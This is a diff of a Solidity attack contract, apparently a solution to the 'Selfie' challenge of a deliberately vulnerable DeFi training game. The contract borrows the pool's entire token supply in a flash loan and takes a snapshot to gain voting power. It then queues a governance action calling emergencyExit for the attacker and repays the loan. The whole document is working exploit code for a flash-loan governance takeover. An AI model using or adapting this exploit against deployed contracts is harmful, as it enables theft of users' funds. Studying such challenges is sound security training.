@@ -7,69 +7,59 @@ import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
 
 interface IPool {
     function flashLoan(
-        IERC3156FlashBorrower _receiver, address _token, uint256 _amount, bytes calldata _data
+        IERC3156FlashBorrower _receiver,
+        address _token,
+        uint256 _amount,
+        bytes calldata _data
     ) external returns (bool);
 }
 
 interface IGovernance {
     function queueAction(address target, uint128 value, bytes calldata data) external returns (uint256 actionId);
-    function getActionCounter() external returns (uint256);
 }
 
-interface IERC20Snapshot is IERC20{
-    function snapshot() external returns(uint256);
+interface IERC20Snapshot is IERC20 {
+    function snapshot() external returns (uint256 lastSnapshotId);
 }
 
-contract AttackSelfie is IERC3156FlashBorrower {
+contract AttackSelfie {
 
-    IPool public pool;
-    IGovernance public governance;
-    IERC20Snapshot public token;
-    address public player;
-    uint256 public amount = 1500000 ether;
+    // 1. Request a flash loan of all the tokens
+    // 2. Queue a new action - emergencyExit(address player)
+    // 3. Pay back the loan
+    // 4. Wait 2 days
+    // 5. Execute the action
 
-    constructor(
-        address _pool,
-        address _governance,
-        address _token,
-        address _player
-    ) {
+    address immutable player;
+    IPool immutable pool;
+    IGovernance immutable governance;
+    IERC20Snapshot immutable token;
+    uint256 constant AMOUNT = 1_500_000 ether;
+
+    constructor(address _pool, address _governance, address _token){
+        player = msg.sender;
         pool = IPool(_pool);
         governance = IGovernance(_governance);
         token = IERC20Snapshot(_token);
-        player = _player;
     }
 
-    function attack() public {
-
-        bytes memory data = abi.encodeWithSignature(
-            "emergencyExit(address)",
-            player
-        );
-
+    function attack() external {
         pool.flashLoan(
-            IERC3156FlashBorrower(address(this)),
-            address(token),
-            amount,
-            data
+            IERC3156FlashBorrower(address(this)), address(token), AMOUNT, "0x111"
         );
     }
 
-    function onFlashLoan(
-        address,
-        address,
-        uint256 _amount,
-        uint256,
-        bytes calldata data
-    ) external returns (bytes32) {
+    function onFlashLoan(address, address, uint256, uint256, bytes calldata) external returns(bytes32) {
+        require(tx.origin == player);
+        require(msg.sender == address(pool));
 
-        require(msg.sender == address(pool), "msg.sender is not pool");
-        require(tx.origin == player, "tx.origin is not player");
+        token.snapshot();
 
-        uint256 id = token.snapshot();
+        bytes memory data = abi.encodeWithSignature("emergencyExit(address)", player);
         governance.queueAction(address(pool), 0, data);
-        uint count = governance.getActionCounter();
-        token.approve(address(pool), _amount);
+
+        token.approve(address(pool), AMOUNT);
         return keccak256("ERC3156FlashBorrower.onFlashLoan");
     }
+
 }
